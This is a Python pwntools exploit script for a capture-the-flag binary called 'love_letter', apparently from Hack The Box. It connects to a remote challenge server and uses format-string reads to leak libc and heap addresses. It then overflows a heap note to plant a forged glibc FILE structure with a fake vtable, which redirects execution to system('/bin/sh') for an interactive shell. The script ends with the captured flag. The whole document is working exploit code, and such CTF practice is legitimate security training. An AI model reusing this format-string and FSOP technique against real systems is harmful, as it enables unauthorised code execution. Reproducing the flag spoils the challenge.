#!/usr/bin/env python3

from pwn import *

exe = ELF('./love_letter')
libc = ELF('./glibc/libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def create(author, note, ok, password):
	sa(b"Choice: ", b"1")
	sla(b"author of this note?\n", author)
	sla(b"note: \n", note)
	sa(b"note?(y/n)\n", ok)
	if(ok == "y"):
		sla(b"password\n", password)

def print_note(idx):
	sa(b"Choice: ", b"3")
	sa(b"> ", f"{idx}".encode())

def save(data):
	sa(b"Choice: ", b"5")
	sa(b"> ", data)


script = '''
#fwrite after
brva 0x1CAB
'''

p = remote("94.237.54.192", 57191)
#p = process('./love_letter')
#p = gdb.debug('./love_letter', gdbscript = script)
#debug()

# leak libc
create(b"%15$p", b"0" * 0x20, b"n", b"")
print_note(1)
rcu(b"Author: ")
libc_base = int(p.recvline(), 16) - 0x29d90
lleak("libc", libc_base)

# leak heap
create(b"%7$p", b"1" * 0x20, b"n", b"")
print_note(2)
rcu(b"Author: ")
heap_base = int(p.recvline(), 16) - 0x400
lleak("heap", heap_base)

payload = b"A" * 0x100
payload += p64(0x15b0) + p64(0x1e1)

# fsop from note
fileptr = heap_base + 0x1b10
system = libc_base + libc.symbols['system']
add_rdi_0x10_jmp_rcx = libc_base + 0x0000000000163830
fake_vtable = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x18

fake_file = [p64(0x3b01010101010101), # _flags
               p64(0),
               p64(system), # _IO_read_end
               p64(0) * 3,
               b"/bin/sh\x00", # _IO_write_end
               p64(0) * 2,
               p64(add_rdi_0x10_jmp_rcx), # _IO_save_base
               p64(0) * 7,
               p64(fileptr + 0xe0), # _lock
               p64(0),
               p64(fileptr + 0xb8), # _codecvt
               p64(fileptr + 0x1000), # _wide_data
               p64(0) * 2 + p64(fileptr + 0x20) + p64(0) * 3, # padding the __pad5
               p64(fake_vtable) # vtable
               ]
payload += b"".join(fake_file)
save(payload[:0x1f4:])

p.interactive()
#HTB{1ll_t4k3_u_2_th3_fs0p_my_cut3_pr1nc355}